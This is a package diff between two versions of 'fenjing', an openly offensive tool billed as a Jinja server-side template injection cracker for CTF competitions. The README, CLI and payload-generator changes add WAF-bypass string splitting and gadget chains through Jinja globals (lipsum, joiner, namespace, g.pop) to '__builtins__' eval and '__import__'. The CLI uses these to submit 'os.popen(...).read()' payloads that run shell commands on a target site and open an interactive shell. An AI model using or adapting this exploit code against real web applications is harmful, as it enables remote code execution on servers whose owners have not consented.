# Comparing `tmp/fenjing-0.4.9.1.tar.gz` & `tmp/fenjing-0.5.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.4.9.1.tar", last modified: Wed Jul 26 15:56:24 2023, max compression
+gzip compressed data, was "fenjing-0.5.0.tar", last modified: Wed Jul 26 19:10:32 2023, max compression
```

## Comparing `fenjing-0.4.9.1.tar` & `fenjing-0.5.0.tar`

### file list

```diff
@@ -1,39 +1,39 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:56:24.391519 fenjing-0.4.9.1/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     9662 2023-07-26 15:56:24.391519 fenjing-0.4.9.1/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     9223 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:56:24.387519 fenjing-0.4.9.1/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)    13707 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     2280 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     3434 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/context_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)     2913 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/cracker.py
--rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/form.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7701 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    34943 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     2206 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/shell_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     4720 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/submitter.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:56:24.387519 fenjing-0.4.9.1/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     5003 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)    10297 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:56:24.387519 fenjing-0.4.9.1/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     9662 2023-07-26 15:56:24.000000 fenjing-0.4.9.1/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-26 15:56:24.000000 fenjing-0.4.9.1/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-26 15:56:24.000000 fenjing-0.4.9.1/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 15:56:24.000000 fenjing-0.4.9.1/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-26 15:56:24.000000 fenjing-0.4.9.1/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-26 15:56:24.391519 fenjing-0.4.9.1/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 15:56:24.387519 fenjing-0.4.9.1/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     2571 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/tests/test_cracker.py
--rw-r--r--   0 runner    (1001) docker     (123)     9180 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3784 2023-07-26 15:56:14.000000 fenjing-0.4.9.1/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:10:32.920802 fenjing-0.5.0/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-26 19:10:20.000000 fenjing-0.5.0/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-26 19:10:20.000000 fenjing-0.5.0/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     9850 2023-07-26 19:10:32.920802 fenjing-0.5.0/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     9413 2023-07-26 19:10:20.000000 fenjing-0.5.0/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-26 19:10:20.000000 fenjing-0.5.0/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:10:32.916802 fenjing-0.5.0/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      203 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       61 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)    15053 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      874 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      919 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2324 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3434 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5462 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3029 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/form.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7701 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    37389 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2206 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1792 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1038 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/shell_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6191 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/submitter.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:10:32.916802 fenjing-0.5.0/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     7489 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     5003 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10297 2023-07-26 19:10:20.000000 fenjing-0.5.0/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:10:32.916802 fenjing-0.5.0/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     9850 2023-07-26 19:10:32.000000 fenjing-0.5.0/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      681 2023-07-26 19:10:32.000000 fenjing-0.5.0/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-26 19:10:32.000000 fenjing-0.5.0/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 19:10:32.000000 fenjing-0.5.0/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-26 19:10:32.000000 fenjing-0.5.0/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       56 2023-07-26 19:10:20.000000 fenjing-0.5.0/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-26 19:10:32.920802 fenjing-0.5.0/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-26 19:10:20.000000 fenjing-0.5.0/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-26 19:10:32.920802 fenjing-0.5.0/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     2083 2023-07-26 19:10:20.000000 fenjing-0.5.0/tests/test_cracker.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5969 2023-07-26 19:10:20.000000 fenjing-0.5.0/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3827 2023-07-26 19:10:20.000000 fenjing-0.5.0/tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.9.1/LICENSE` & `fenjing-0.5.0/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/PKG-INFO` & `fenjing-0.5.0/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.9.1
+Version: 0.5.0
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -25,14 +25,15 @@
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
 - 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
 - 支持攻击对应的HTML表单或HTML路径
 - 使用Shell指令对要发送的payload进行编码
+- \[试验性功能\]使用`--eval-args-payload`将payload放进GET参数中提交，有效降低payload长度
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -148,15 +149,15 @@
   - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
   - 参数大致上和crack相同，但是只需要提供对应的路径
   - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 
 一些特殊的选项：
-
+- `--eval-args-payload`：试验性选项，将payload放在GET参数x中提交
 - `--detect-mode`：检测模式，可为accurate或fast
   - 默认为accurate
   - 在开始尝试触发WAF, 获取WAF页面对应hash时：
     - accurate模式会一个接一个地发送尽可能多的payload
     - fast模式会将多个payload组合在一起发送，
   - 在生成payload时：
     - accurate模式会先从最简单的方法试起
```

### Comparing `fenjing-0.4.9.1/README.md` & `fenjing-0.5.0/README.md`

 * *Files 3% similar despite different names*

```diff
@@ -12,14 +12,15 @@
 
 - 集成了大部分CTF中的SSTI WAF绕过技巧
 - 全自动扫描HTML页面中的form元素并进行攻击
 - 全自动分析网站的WAF并生成相应的payload
 - 使用精确模式全面分析网站或使用快速模式减少不必要的网络请求
 - 支持攻击对应的HTML表单或HTML路径
 - 使用Shell指令对要发送的payload进行编码
+- \[试验性功能\]使用`--eval-args-payload`将payload放进GET参数中提交，有效降低payload长度
 - 方便的网页界面/命令行界面
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
@@ -135,15 +136,15 @@
   - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
   - 参数大致上和crack相同，但是只需要提供对应的路径
   - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
 - get-config: 对某个特定的表单进行攻击，但是只获取flask config
   - 参数大致上和crack相同
 
 一些特殊的选项：
-
+- `--eval-args-payload`：试验性选项，将payload放在GET参数x中提交
 - `--detect-mode`：检测模式，可为accurate或fast
   - 默认为accurate
   - 在开始尝试触发WAF, 获取WAF页面对应hash时：
     - accurate模式会一个接一个地发送尽可能多的payload
     - fast模式会将多个payload组合在一起发送，
   - 在生成payload时：
     - accurate模式会先从最简单的方法试起
```

### Comparing `fenjing-0.4.9.1/fenjing/cli.py` & `fenjing-0.5.0/fenjing/cli.py`

 * *Files 5% similar despite different names*

```diff
@@ -5,14 +5,16 @@
 import logging
 from urllib.parse import urlparse
 from typing import Callable, List, Dict
 from functools import partial
 
 import click
 
+from fenjing.payload_gen import generate
+
 
 from .form import get_form
 from .cracker import Cracker
 from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
@@ -63,15 +65,32 @@
     payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
     if payload is None:
         logger.warning("%s generating payload.", colored("red", "Failed"))
         return ""
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
         payload_wont_print = (
-            "Payload generator says that this " + "payload %s command execution result."
+            "Payload generator says that this payload %s command execution result."
+        )
+        logger.warning(payload_wont_print, colored("red", "won't print"))
+    result = submitter.submit(payload)
+    assert result is not None
+    return result.text
+
+def cmd_exec_generate_func(
+    cmd: str, submitter: Submitter, generate_func: Callable, will_print: bool
+) -> str:
+    payload = generate_func(cmd)
+    if payload is None:
+        logger.warning("%s generating payload.", colored("red", "Failed"))
+        return ""
+    logger.info("Submit payload %s", colored("blue", payload))
+    if not will_print:
+        payload_wont_print = (
+            "This payload %s command execution result."
         )
         logger.warning(payload_wont_print, colored("red", "won't print"))
     result = submitter.submit(payload)
     assert result is not None
     return result.text
 
 
@@ -201,27 +220,31 @@
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
+@click.option(
+    "--eval-args-payload", default=False, is_flag=True, help="[试验性]是否在GET参数中传递Eval payload"
+)
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
 @click.option("--proxy", default="", help="请求时使用的代理")
 @click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
 def crack(
     url: str,
     action: str,
     method: str,
     inputs: str,
     exec_cmd: str,
     interval: float,
     detect_mode: str,
+    eval_args_payload: bool,
     user_agent: str,
     header: tuple,
     cookies: str,
     proxy: str,
     tamper_cmd: str,
 ):
     """
@@ -239,37 +262,52 @@
         user_agent=user_agent,
         headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
         proxy=proxy,
     )
     tamperer = None
     if tamper_cmd:
         tamperer = shell_tamperer(tamper_cmd)
-    found, submitter, full_payload_gen = False, None, None
+    found, submitter, result = False, None, None
     for input_field in form["inputs"]:
         submitter = FormSubmitter(url, form, input_field, requester)
         if tamperer:
             submitter.add_tamperer(tamperer)
         cracker = Cracker(submitter, detect_mode=detect_mode)
         if not cracker.has_respond():
             logger.info("Test input field %s failed, continue...", input_field)
             continue
-        full_payload_gen = cracker.crack()
-        if not full_payload_gen:
+        if eval_args_payload:
+            result = cracker.crack_eval_args()
+        else:
+            result = cracker.crack()
+        if not result:
             logger.info("Test input field %s failed, continue...", input_field)
             continue
         found = True
     if not found:
         logger.warning("Test form failed...")
         return
-    assert submitter is not None and full_payload_gen is not None
-    cmd_exec_func = partial(
-        cmd_exec_submitter,
-        submitter=submitter,
-        full_payload_gen=full_payload_gen,
-    )
+    assert submitter is not None and result is not None
+    if eval_args_payload:
+        assert isinstance(result,tuple)
+        full_payload_gen, submitter, will_print = result
+        cmd_exec_func = partial(
+            cmd_exec_generate_func,
+            submitter = submitter,
+            generate_func = lambda x: "__import__('os').popen({}).read()".format(repr(x)),
+            will_print = will_print
+        )
+    else:
+        assert isinstance(result, FullPayloadGen)
+        full_payload_gen = result
+        cmd_exec_func = partial(
+            cmd_exec_submitter,
+            submitter=submitter,
+            full_payload_gen=full_payload_gen,
+        )
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
```

### Comparing `fenjing-0.4.9.1/fenjing/colorize.py` & `fenjing-0.5.0/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/config_payload.py` & `fenjing-0.5.0/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/const.py` & `fenjing-0.5.0/fenjing/const.py`

 * *Files 2% similar despite different names*

```diff
@@ -3,14 +3,15 @@
 
 DEFAULT_USER_AGENT = "Fenjing/0.1"
 
 # 支持的类型
 
 LITERAL = "literal"
 UNSATISFIED = "unsatisfied"
+ONEOF = "oneof"
 WITH_CONTEXT_VAR = "with_context_var"
 ZERO = "zero"
 POSITIVE_INTEGER = "positive_integer"
 INTEGER = "integer"
 STRING_STRING_CONCAT = "string_string_concat"
 STRING_PERCENT = "string_percent"
 STRING_PERCENT_LOWER_C = "string_percent_lower_c"
@@ -21,14 +22,15 @@
 CHAR = "char"
 STRING = "string"
 FORMULAR_SUM = "formular_sum"
 ATTRIBUTE = "attribute"
 ITEM = "item"
 CLASS_ATTRIBUTE = "class_attribute"
 CHAINED_ATTRIBUTE_ITEM = "chained_attribute_item"
+IMPORT_FUNC = "import_func"
 EVAL_FUNC = "eval_func"
 EVAL = "eval"
 CONFIG = "config"
 MODULE_OS = "module_os"
 OS_POPEN_OBJ = "os_popen_obj"
 OS_POPEN_READ = "os_popen_read"
```

### Comparing `fenjing-0.4.9.1/fenjing/context_vars.py` & `fenjing-0.5.0/fenjing/context_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/form.py` & `fenjing-0.5.0/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/full_payload_gen.py` & `fenjing-0.5.0/fenjing/full_payload_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.9.1/fenjing/payload_gen.py` & `fenjing-0.5.0/fenjing/payload_gen.py`

 * *Files 6% similar despite different names*

```diff
@@ -65,26 +65,27 @@
         ]
         self.generate_funcs = [
             (
                 (lambda gen_req: gen_req[0] == LITERAL),
                 (lambda gen_req: (gen_req[1], {})),
             ),
             ((lambda gen_req: gen_req[0] == UNSATISFIED), (lambda gen_req: None)),
+            ((lambda gen_req: gen_req[0] == ONEOF), self.oneof_generate),
             (
                 (lambda gen_req: gen_req[0] == WITH_CONTEXT_VAR),
                 (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]})),
             ),
             (
                 (lambda gen_req: hashable(gen_req) and gen_req in self.cache),
                 (lambda gen_req: self.cache[gen_req]),
             ),
             ((lambda gen_req: True), self.common_generate),
         ]
         self.used_count = defaultdict(int)
-
+        self.detect_mode = detect_mode
         if detect_mode == DETECT_MODE_FAST:
             for k in gen_weight_default:
                 self.used_count[k] += gen_weight_default[k]
 
         self.callback = callback if callback else (lambda x, y: None)
 
     def generate_by_list(
@@ -106,23 +107,32 @@
                 break
             else:
                 raise Exception("it shouldn't runs this line")
         if not self.waf_func(str_result):
             return None
         return str_result, used_context
 
+    def oneof_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
+        _, *reqs = gen_req
+        for req in reqs:
+            ret = self.generate_by_list(req)
+            if ret is not None:
+                return ret
+        return None
+
     def common_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
         gen_type: str
         gen_type, *args = gen_req
         if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
             logger.error("Unknown type: %s", gen_type)
             return None
 
         gens = req_gens[gen_type].copy()
-        gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
+        if self.detect_mode == DETECT_MODE_FAST:
+            gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
             gen_ret: ReqGenReturn = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
             if ret is None:
                 if hashable(gen_req):
                     self.cache[gen_req] = ret
                 continue
@@ -900,15 +910,51 @@
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
         return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == value][0]
     return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
+@req_gen
+def gen_string_twostringconcat(context: dict, value: str):
+    if len(value) <= 2 or len(value) > 20:
+        return [
+            (UNSATISFIED, )
+        ]
+    return [
+        (
+            ONEOF,
+            *[
+                [
+                    (LITERAL, "'{}'".format(value[:i].replace("'", "\\'"))),
+                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'")))
+                ]
+                for i in range(1, len(value) - 1)
+            ]
+        )
+    ]
 
+@req_gen
+def gen_string_twostringconcat2(context: dict, value: str):
+    if len(value) <= 2 or len(value) > 20:
+        return [
+            (UNSATISFIED, )
+        ]
+    return [
+        (
+            ONEOF,
+            *[
+                [
+                    (LITERAL, "\"{}\"".format(value[:i].replace("\"", "\\\""))),
+                    (LITERAL, "\"{}\"".format(value[i:].replace("\"", "\\\"")))
+                ]
+                for i in range(1, len(value) - 1)
+            ]
+        )
+    ]
 
 @req_gen
 def gen_string_concat1(context: dict, value: str):
     return [
         (
             LITERAL,
             "({})".format(
@@ -1095,82 +1141,74 @@
 
 
 # ---
 
 
 @req_gen
 def gen_attribute_normal1(context, obj_req, attr_name):
-    if not re.match("[A-Za-z_][A-Za-z0-9_]+", attr_name):
+    if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", attr_name):
         return [(UNSATISFIED,)]
     return [
-        (LITERAL, "("),
         obj_req,
         (LITERAL, "."),
         (LITERAL, attr_name),
-        (LITERAL, ")"),
     ]
 
 
 @req_gen
 def gen_attribute_normal2(context, obj_req, attr_name):
     return [
-        (LITERAL, "("),
         obj_req,
         (LITERAL, "["),
         (STRING, attr_name),
-        (LITERAL, "])"),
+        (LITERAL, "]"),
     ]
 
 
 @req_gen
 def gen_attribute_attrfilter(context, obj_req, attr_name):
     return [
-        (LITERAL, "("),
         obj_req,
         (LITERAL, "|attr("),
         (STRING, attr_name),
-        (LITERAL, "))"),
+        (LITERAL, ")"),
     ]
 
 
 # ---
 
 
 @req_gen
 def gen_item_normal1(context, obj_req, item_name):
-    if not re.match("[A-Za-z_][A-Za-z0-9_]+", item_name):
+    if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", item_name):
         return [(UNSATISFIED,)]
     return [
-        (LITERAL, "("),
         obj_req,
         (LITERAL, "."),
         (LITERAL, item_name),
-        (LITERAL, ")"),
     ]
 
 
 @req_gen
 def gen_item_normal2(context, obj_req, item_name):
     return [
-        (LITERAL, "("),
         obj_req,
         (LITERAL, "["),
         (STRING, item_name),
-        (LITERAL, "])"),
+        (LITERAL, "]"),
     ]
 
 
 @req_gen
 def gen_item_dunderfunc(context, obj_req, item_name):
     return [
-        (LITERAL, "("),
         (ATTRIBUTE, obj_req, "__getitem__"),
         (LITERAL, "("),
         (STRING, item_name),
-        (LITERAL, "))"),
+        (LITERAL, ")"),
     ]
 
 
 # ---
 
 
 @req_gen
@@ -1225,77 +1263,130 @@
             *other_req,
         ),
     ]
 
 
 # ---
 
-
-# ---
+@req_gen
+def gen_import_func_g(context):
+    return [(
+        CHAINED_ATTRIBUTE_ITEM,
+        (LITERAL, "g"),
+        (ATTRIBUTE, "pop"),
+        (ATTRIBUTE, "__globals__"),
+        (ITEM, "__builtins__"),
+        (ITEM, "__import__")
+    )]
 
 
 @req_gen
-def gen_eval_func_lipsum(context):
+def gen_import_func_lipsum(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "lipsum"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
-            (ITEM, "eval"),
+            (ITEM, "__import__"),
         )
     ]
 
 
 @req_gen
-def gen_eval_func_joiner(context):
+def gen_import_func_joiner(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "joiner"),
             (ATTRIBUTE, "__init__"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
-            (ITEM, "eval"),
+            (ITEM, "__import__"),
         )
     ]
 
 
 @req_gen
-def gen_eval_func_namespace(context):
+def gen_import_func_namespace(context):
     return [(
         CHAINED_ATTRIBUTE_ITEM,
         (LITERAL, "namespace"),
         (ATTRIBUTE, "__init__"),
         (ATTRIBUTE, "__globals__"),
         (ITEM, "__builtins__"),
-        (ITEM, "eval")
+        (ITEM, "__import__")
     )]
 
+
+
+# ---
+
+
 @req_gen
 def gen_eval_func_g(context):
     return [(
         CHAINED_ATTRIBUTE_ITEM,
         (LITERAL, "g"),
         (ATTRIBUTE, "pop"),
         (ATTRIBUTE, "__globals__"),
         (ITEM, "__builtins__"),
         (ITEM, "eval")
     )]
 
+
+@req_gen
+def gen_eval_func_lipsum(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "lipsum"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+
+@req_gen
+def gen_eval_func_joiner(context):
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "joiner"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
+
+
+@req_gen
+def gen_eval_func_namespace(context):
+    return [(
+        CHAINED_ATTRIBUTE_ITEM,
+        (LITERAL, "namespace"),
+        (ATTRIBUTE, "__init__"),
+        (ATTRIBUTE, "__globals__"),
+        (ITEM, "__builtins__"),
+        (ITEM, "eval")
+    )]
+
+
 # ---
 
 
 @req_gen
-def gen_eval_normal(context, code):
+def gen_eval_normal(context, eval_param):
     return [
         (LITERAL, "("),
         (EVAL_FUNC,),
         (LITERAL, "("),
-        (STRING, code),
+        eval_param,
         (LITERAL, "))"),
     ]
 
 
 # ---
 
 
@@ -1334,30 +1425,28 @@
 #         )
 #     ]
 
 
 # ---
 
 
-# @req_gen
-# def gen_module_os_urlfor(context):
-#     return [
-#         (
-#             CHAINED_ATTRIBUTE_ITEM,
-#             (LITERAL, "url_for"),
-#             (ATTRIBUTE, "__globals__"),
-#             (ITEM, "os"),
-#         )
-#     ]
+@req_gen
+def gen_module_os_import(context):
+    return [
+        (IMPORT_FUNC, ),
+        (LITERAL, "("),
+        (STRING, "os"),
+        (LITERAL, ")"),
+    ]
 
 
 @req_gen
 def gen_module_os_eval(context):
     return [
-        (EVAL, "__import__"),
+        (EVAL, (STRING, "__import__")),
         (LITERAL, "("),
         (STRING, "os"),
         (LITERAL, ")"),
     ]
 
 
 @req_gen
@@ -1389,43 +1478,51 @@
     ]
 
 
 
 @req_gen
 def gen_os_popen_obj_eval(context, cmd):
     cmd = cmd.replace("'", "\\'")
-    return [(EVAL, "__import__('os').popen('" + cmd + "')")]
+    return [(EVAL, (STRING, "__import__('os').popen('" + cmd + "')"))]
 
 
 # ---
 
 
 @req_gen
 def gen_os_popen_read_normal(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "())"),
     ]
 
 @req_gen
+def gen_os_popen_read_normalspace(context, cmd):
+    return [
+        (LITERAL, "("),
+        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
+        (LITERAL, "( ))"),
+    ]
+
+@req_gen
